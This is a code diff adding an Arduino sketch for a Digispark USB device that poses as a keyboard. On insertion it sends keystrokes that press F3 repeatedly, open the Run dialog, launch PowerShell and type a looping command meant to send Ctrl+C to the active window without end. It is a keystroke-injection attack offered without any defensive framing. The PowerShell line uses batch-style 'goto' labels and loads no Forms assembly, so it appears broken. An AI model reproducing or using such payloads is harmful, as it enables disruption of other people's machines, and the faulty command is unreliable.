@@ -1,0 +1,27 @@
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1800);
+
+  for (int i = 0; i < 70; i++) {
+    DigiKeyboard.sendKeyStroke(KEY_F3);
+    DigiKeyboard.delay(10);
+  }
+
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(400);
+
+  DigiKeyboard.print(F("powershell"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+
+  DigiKeyboard.println(F(":a; [System.Windows.Forms.SendKeys]::SendWait('^{c}'); Start-Sleep -Milliseconds 150; goto a"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  for(;;) {
+    DigiKeyboard.delay(10000);
+  }
+}
